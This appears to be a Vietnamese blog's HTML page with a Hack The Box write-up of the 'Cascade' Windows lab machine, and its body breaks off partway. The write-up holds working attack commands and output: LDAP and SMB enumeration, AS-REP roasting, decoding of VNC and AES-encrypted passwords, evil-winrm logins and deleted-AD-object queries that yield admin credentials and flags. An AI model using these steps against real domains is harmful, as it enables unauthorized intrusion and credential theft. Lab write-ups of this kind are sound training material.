<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[Hackthebox - Writeup] Cascade | minhtuanact|Blog - Keep a flame in the rain!</title>
<meta name=keywords content="HackTheBox,WriteUp,cascade"><meta name=description content="
Cascade là bài thứ mấy mình chơi với machine Windows trên hackthebox cũng không nhớ nữa, chỉ nhớ là bài này mình làm vào đúng tối sinh nhật năm nay của mình. Là một bài khá hay với LDAP, mình đã học hỏi được rất nhiều thứ từ bài này. Nhìn lượt vote cũng thấy được bài này chủ yếu sử dụng kỹ thuật Enumeration. Hi vọng writeup này giúp ích gì được cho các bạn đọc bài này :P."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/hackthebox-writeup-cascade/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.e4f77e49b7bc8b49af2e5878ca22d15ad5c140fc859ce62cca1a9e772333eb5e.css integrity="sha256-5Pd+Sbe8i0mvLlh4yiLRWtXBQPyFnOYsyhqedyMz614=" rel="preload stylesheet" as=style><link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://minhtuanact.github.io/posts/hackthebox-writeup-cascade/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://minhtuanact.github.io/posts/hackthebox-writeup-cascade/"><meta property="og:site_name" content="minhtuanact|Blog - Keep a flame in the rain!"><meta property="og:title" content="[Hackthebox - Writeup] Cascade"><meta property="og:description" content="
Cascade là bài thứ mấy mình chơi với machine Windows trên hackthebox cũng không nhớ nữa, chỉ nhớ là bài này mình làm vào đúng tối sinh nhật năm nay của mình. Là một bài khá hay với LDAP, mình đã học hỏi được rất nhiều thứ từ bài này. Nhìn lượt vote cũng thấy được bài này chủ yếu sử dụng kỹ thuật Enumeration. Hi vọng writeup này giúp ích gì được cho các bạn đọc bài này :P."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-07-27T10:16:19+07:00"><meta property="article:modified_time" content="2020-07-27T10:16:19+07:00"><meta property="article:tag" content="HackTheBox"><meta property="article:tag" content="WriteUp"><meta property="article:tag" content="Cascade"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[Hackthebox - Writeup] Cascade"><meta name=twitter:description content="
Cascade là bài thứ mấy mình chơi với machine Windows trên hackthebox cũng không nhớ nữa, chỉ nhớ là bài này mình làm vào đúng tối sinh nhật năm nay của mình. Là một bài khá hay với LDAP, mình đã học hỏi được rất nhiều thứ từ bài này. Nhìn lượt vote cũng thấy được bài này chủ yếu sử dụng kỹ thuật Enumeration. Hi vọng writeup này giúp ích gì được cho các bạn đọc bài này :P."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"[Hackthebox - Writeup] Cascade","item":"https://minhtuanact.github.io/posts/hackthebox-writeup-cascade/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[Hackthebox - Writeup] Cascade","name":"[Hackthebox - Writeup] Cascade","description":"\nCascade là bài thứ mấy mình chơi với machine Windows trên hackthebox cũng không nhớ nữa, chỉ nhớ là bài này mình làm vào đúng tối sinh nhật năm nay của mình. Là một bài khá hay với LDAP, mình đã học hỏi được rất nhiều thứ từ bài này. Nhìn lượt vote cũng thấy được bài này chủ yếu sử dụng kỹ thuật Enumeration. Hi vọng writeup này giúp ích gì được cho các bạn đọc bài này :P.\n","keywords":["HackTheBox","WriteUp","cascade"],"articleBody":"\nCascade là bài thứ mấy mình chơi với machine Windows trên hackthebox cũng không nhớ nữa, chỉ nhớ là bài này mình làm vào đúng tối sinh nhật năm nay của mình. Là một bài khá hay với LDAP, mình đã học hỏi được rất nhiều thứ từ bài này. Nhìn lượt vote cũng thấy được bài này chủ yếu sử dụng kỹ thuật Enumeration. Hi vọng writeup này giúp ích gì được cho các bạn đọc bài này :P.\nRecon Sử dụng enum4linux thì list ra được 1 danh sách người dùng\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 user:[CascGuest] rid:[0x1f5] user:[arksvc] rid:[0x452] user:[s.smith] rid:[0x453] user:[r.thompson] rid:[0x455] user:[util] rid:[0x457] user:[j.wakefield] rid:[0x45c] user:[s.hickson] rid:[0x461] user:[j.goodhand] rid:[0x462] user:[a.turnbull] rid:[0x464] user:[e.crowe] rid:[0x467] user:[b.hanson] rid:[0x468] user:[d.burman] rid:[0x469] user:[BackupSvc] rid:[0x46a] user:[j.allen] rid:[0x46e] user:[i.croft] rid:[0x46f] Tuy nhiên mình đang tập trung chủ yếu vào Group này vì thấy nó lạ lạ, có linh cảm cần phải tấn công vào đây.\n1 Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\\arksvc Loay hoay 1 hồi nhưng chẳng phát hiện được gì tại đây cả.\nMình thử khá nhiều trường hợp, lấy ra 1 list user rồi cho vào GetNPUser.py cũng không dump được hash passwd nào\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ➜ Cascade sudo GetNPUsers.py cascade.local/ -usersfile user -format john Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) Đến đây thì thực sự bế tắc, lang thang trên mạng một hồi thì mình tìm thấy ở đây kiểm tra kết nối LDAP từ phía client https://serverfault.com/questions/452935/how-to-test-a-ldap-connection-from-a-client\n1 ➜ Cascade ldapsearch -x -b \"dc=cascade, dc=local\" -h 10.10.10.182 \u003e ldapsearch.txt Do danh sách quá dài nên mình lưu vào file ldapsearch.txt để xem\n1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ Cascade cat ldapsearch.txt| grep \"Pwd\" maxPwdAge: -9223372036854775808 minPwdAge: 0 minPwdLength: 5 badPwdCount: 0 maxPwdAge: -37108517437440 minPwdAge: 0 minPwdLength: 0 badPwdCount: 0 badPwdCount: 0 badPwdCount: 0 badPwdCount: 0 cascadeLegacyPwd: clk0bjVldmE= Ở đây mình nhận được 1 đoạn string cascadeLegacyPwd: clk0bjVldmE= có lẽ là passwd cũ hoặc passwd mặc định, sử dụng passwd này thử với tất cả user bên trên xem đăng nhập được với user nào không, đầu tiên phải decode passwd ra trước đã\n1 2 ➜ Cascade echo -n clk0bjVldmE= | base64 -d rY4n5eva Đầu tiên mình thử với Evil-WinRM nhưng mà k hoạt động, sau đó mình thử với smb thì được 1 tài khoản r.thompson\n1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ Cascade sudo smbclient.py r.thompson:rY4n5eva@10.10.10.182 Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation Type help for list of commands # shares ADMIN$ Audit$ C$ Data IPC$ NETLOGON print$ SYSVOL Sau khi khám phá toàn bộ nội dung được shares trên smb, mình lấy được file Meeting_Notes_June_2018.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u003cp\u003eFor anyone that missed yesterdays meeting (Im looking at you Ben). Main points are below:\u003c/p\u003e \u003cp class=MsoNormal\u003e\u003co:p\u003e\u0026nbsp;\u003c/o:p\u003e\u003c/p\u003e \u003cp\u003e-- New production network will be going live on Wednesday so keep an eye out for any issues. \u003c/p\u003e \u003cp\u003e-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). \u003c/p\u003e \u003cp\u003e-- The winner of the Best GPO competition will be announced on Friday so get your submissions in soon.\u003c/p\u003e Và 1 file VNC Install.reg ở \\IT\\Temp\\s.smith\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ➜ Cascade cat VNC\\ Install.reg Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC] [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server] \"ExtraPorts\"=\"\" \"QueryTimeout\"=dword:0000001e \"QueryAcceptOnTimeout\"=dword:00000000 \"LocalInputPriorityTimeout\"=dword:00000003 \"LocalInputPriority\"=dword:00000000 \"BlockRemoteInput\"=dword:00000000 \"BlockLocalInput\"=dword:00000000 \"IpAccessControl\"=\"\" \"RfbPort\"=dword:0000170c \"HttpPort\"=dword:000016a8 \"DisconnectAction\"=dword:00000000 \"AcceptRfbConnections\"=dword:00000001 \"UseVncAuthentication\"=dword:00000001 \"UseControlAuthentication\"=dword:00000000 \"RepeatControlAuthentication\"=dword:00000000 \"LoopbackOnly\"=dword:00000000 \"AcceptHttpConnections\"=dword:00000001 \"LogLevel\"=dword:00000000 \"EnableFileTransfers\"=dword:00000001 \"RemoveWallpaper\"=dword:00000001 \"UseD3D\"=dword:00000001 \"UseMirrorDriver\"=dword:00000001 \"EnableUrlParams\"=dword:00000001 \"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f \"AlwaysShared\"=dword:00000000 \"NeverShared\"=dword:00000000 \"DisconnectClients\"=dword:00000001 \"PollingInterval\"=dword:000003e8 \"AllowLoopback\"=dword:00000000 \"VideoRecognitionInterval\"=dword:00000bb8 Chúng ta có thể thấy được đoạn\n1 \"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f Tuy nhiên đoạn hex passwd này được sử dụng với phần mềm TightVNC để lấy ra được passwd chính. Có thể sử dụng script ở đây https://github.com/trinitronx/vncpasswd.py hoặc sử dụng chương trình vncpwd download cho Windows tại đây http://aluigi.altervista.org/pwdrec/vncpwd.zip\nỞ đây mình đang chạy windows nên chọn vncpwd chạy luôn cho lẹ\nPasswd là sT333ve2\nDo file này được lấy từ người dùng s.smith nên mình đã thử luôn passwd này với user này luôn với Evil-WinRM Và chúng ta có user\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ➜ Cascade evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\s.smith\\Documents\u003e ls *Evil-WinRM* PS C:\\Users\\s.smith\\Documents\u003e cd .. *Evil-WinRM* PS C:\\Users\\s.smith\u003e cd Desktop *Evil-WinRM* PS C:\\Users\\s.smith\\Desktop\u003e ls Directory: C:\\Users\\s.smith\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 4/8/2020 4:07 PM 34 user.txt -a---- 3/25/2020 11:17 AM 1031 WinDirStat.lnk *Evil-WinRM* PS C:\\Users\\s.smith\\Desktop\u003e cat user.txt 77d989cc96e4ab408eb522047a5ebe8c Get Root Thử tìm kiếm xung quanh nhưng không phát hiện ra được gì nhiều, thử đăng nhập tài khoản s.smith với dịch vụ SMB xem có đang được chia sẻ dữ liệu gì không.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ➜ ~ sudo smbclient.py s.smith:sT333ve2@10.10.10.182 Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation Type help for list of commands # shares ADMIN$ Audit$ C$ Data IPC$ NETLOGON print$ SYSVOL # use Audit$ # ls drw-rw-rw- 0 Thu Jan 30 01:01:26 2020 . drw-rw-rw- 0 Thu Jan 30 01:01:26 2020 .. -rw-rw-rw- 13312 Wed Jan 29 04:47:08 2020 CascAudit.exe -rw-rw-rw- 12288 Thu Jan 30 01:01:26 2020 CascCrypto.dll drw-rw-rw- 0 Wed Jan 29 04:43:18 2020 DB -rw-rw-rw- 45 Wed Jan 29 06:29:47 2020 RunAudit.bat -rw-rw-rw- 363520 Wed Jan 29 03:42:18 2020 System.Data.SQLite.dll -rw-rw-rw- 186880 Wed Jan 29 03:42:18 2020 System.Data.SQLite.EF6.dll drw-rw-rw- 0 Wed Jan 29 03:42:18 2020 x64 drw-rw-rw- 0 Wed Jan 29 03:42:18 2020 x86 Chúng ta lấy được chương trình CaseAudit.exe và thư viện CascCrypto.dll dùng để mã hoá. Trong thư mục DB cũng lấy được 1 file db sqlite3.\nNội dung file db\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ➜ Cascade sqlite3 Audit.db SQLite version 3.31.1 2020-01-27 19:55:54 Enter \".help\" for usage hints. sqlite\u003e .table DeletedUserAudit Ldap Misc sqlite\u003e select * from DeletedUserAudit ...\u003e ; 6|test|Test DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local 7|deleted|deleted guy DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local 9|TempAdmin|TempAdmin DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local sqlite\u003e select * from Ldap; 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local sqlite\u003e select * from Misc; sqlite\u003e Chúng ta lấy được 1 đoạn encrypt bằng base64. Tuy nhiên sau khi giải mã thì dường như đoạn mã hoá này phải thêm 1 bước giải mã nữa. Thực hiện decompile CaseAudit.exe và CaseCrypto.dll bằng dotPeek để xem chương trình thực hiện mã hoá và giải mã như nào.\nFile CaseCrypto.dll\nThực hiện giải mã với AES 128 bit, sử dụng mode CBC, khoá IV = 1tdyjCbY1Ix49842\nTiếp tục biên dịch file CaseAudit.exe\nĐoạn code sẽ truy vấn vào bảng LDAP trong CSDL rồi thực hiện encrypt với key=c4scadek3y654321. Sử dụng key và IV để giải mã.\nỞ đây mình sử dụng CyberChef để giải mã Decrypt\nVậy ta thu được mật khẩu của user ArkSvc:w3lc0meFr31nd\nThực hiện đăng nhập với Evil-WinRM và chúng ta có\nKiểm tra 1 chủ thấy người dùng Arksvc thuộc Group AD Recycle Bin\nSử dụng winPEAS.exe cũng không thu được kết quả gì, do mình thuộc Group AD Recycle Bin, nên mình có thể tìm kiếm được đã có những Account nào đã bị xoá.\nhttps://social.technet.microsoft.com/Forums/en-US/5424e204-d601-4330-a7ed-331134e47e18/filter-deleted-users-in-getadobject-cmdlet-also-returns-deleted-computers?forum=ITCG\nSau khi googling thì tìm được đoạn code như sau\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u003e get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq \"user\"} -IncludeDeletedObjects Deleted : True DistinguishedName : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe Deleted : True DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 Vậy là chúng ta có user TempAdmin đã bị xoá, vậy có thể khôi phục lại tài khoản này và lên được admin hay không.\nNhưng user này lại k có quyền khôi phục lại account TempAdmin.\nTuy nhiên chúng ta có thể xem được Properties của account\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u003e get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq \"user\"} -IncludeDeletedObjects -Properties * accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage : 0 countryCode : 0 Created : 1/27/2020 3:23:08 AM createTimeStamp : 1/27/2020 3:23:08 AM Deleted : True Description : DisplayName : TempAdmin DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName : TempAdmin instanceType : 4 isDeleted : True LastKnownParent : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 logonCount : 0 Modified : 1/27/2020 3:24:34 AM modifyTimeStamp : 1/27/2020 3:24:34 AM msDS-LastKnownRDN : TempAdmin Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 Lại 1 lần nữa thấy sự xuất hiện của cascadeLegacyPwd\n1 2 ➜ Cascade echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d baCT3r1aN00dles Thử đăng nhập với tài khoản Administrator với mật khẩu trên\n1 2 3 4 5 6 7 8 9 10 ➜ Cascade evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e cd .. *Evil-WinRM* PS C:\\Users\\Administrator\u003e cd Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e cat root.txt 0ec81c0ccc6c0b0923b9db5e97dde189 ","wordCount":"1767","inLanguage":"en","image":"https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2020-07-27T10:16:19+07:00","dateModified":"2020-07-27T10:16:19+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/hackthebox-writeup-cascade/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li><li><a href=https://minhtuanact.github.io/about/ title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">[Hackthebox - Writeup] Cascade</h1><div class=post-meta><span title='2020-07-27 10:16:19 +0700 +0700'>July 27, 2020</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#recon aria-label=Recon>Recon</a></li><li><a href=#get-root aria-label="Get Root">Get Root</a></li></ul></div></details></div><div class=post-content><p><img loading=lazy src=https://images.viblo.asia/a1eb482a-a177-4c69-864f-844be6b8516b.png></p><p>Cascade là bài thứ mấy mình chơi với machine Windows trên hackthebox cũng không nhớ nữa, chỉ nhớ là bài này mình làm vào đúng tối sinh nhật năm nay của mình. Là một bài khá hay với LDAP, mình đã học hỏi được rất nhiều thứ từ bài này. Nhìn lượt vote cũng thấy được bài này chủ yếu sử dụng kỹ thuật Enumeration. Hi vọng writeup này giúp ích gì được cho các bạn đọc bài này :P.</p><h2 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h2><p>Sử dụng enum4linux thì list ra được 1 danh sách người dùng</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>CascGuest</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x1f5</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>arksvc</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x452</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>s.smith</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x453</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>r.thompson</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x455</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>util</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x457</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>j.wakefield</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x45c</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>s.hickson</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x461</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>j.goodhand</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x462</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>a.turnbull</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x464</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>e.crowe</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x467</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>b.hanson</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x468</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>d.burman</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x469</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>BackupSvc</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x46a</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>j.allen</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x46e</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=err>:</span><span class=p>[</span><span class=no>i.croft</span><span class=p>]</span> <span class=n>rid</span><span class=err>:</span><span class=p>[</span><span class=n>0x46f</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Tuy nhiên mình đang tập trung chủ yếu vào Group này vì thấy nó lạ lạ, có linh cảm cần phải tấn công vào đây.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Group &#39;AD Recycle Bin&#39; (RID: 1119) has member: CASCADE\arksvc
</span></span></code></pre></td></tr></table></div></div><p>Loay hoay 1 hồi nhưng chẳng phát hiện được gì tại đây cả.</p><p>Mình thử khá nhiều trường hợp, lấy ra 1 list user rồi cho vào <code>GetNPUser.py</code> cũng không dump được hash passwd nào</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=err>➜</span>  <span class=n>Cascade</span> <span class=n>sudo</span> <span class=n>GetNPUsers</span><span class=p>.</span><span class=py>py</span> <span class=n>cascade</span><span class=p>.</span><span class=n>local</span><span class=p>/</span> <span class=n>-usersfile</span> <span class=n>user</span> <span class=n>-format</span> <span class=n>john</span>
</span></span><span class=line><span class=cl><span class=n>Impacket</span> <span class=n>v0</span><span class=p>.</span><span class=py>9</span><span class=p>.</span><span class=py>22</span><span class=p>.</span><span class=n>dev1</span><span class=p>+</span><span class=mf>20200327.103853</span><span class=p>.</span><span class=py>7e505892</span> <span class=p>-</span> <span class=n>Copyright</span> <span class=mf>2020</span> <span class=n>SecureAuth</span> <span class=n>Corporation</span>
</span></span><span class=line><span class=cl>
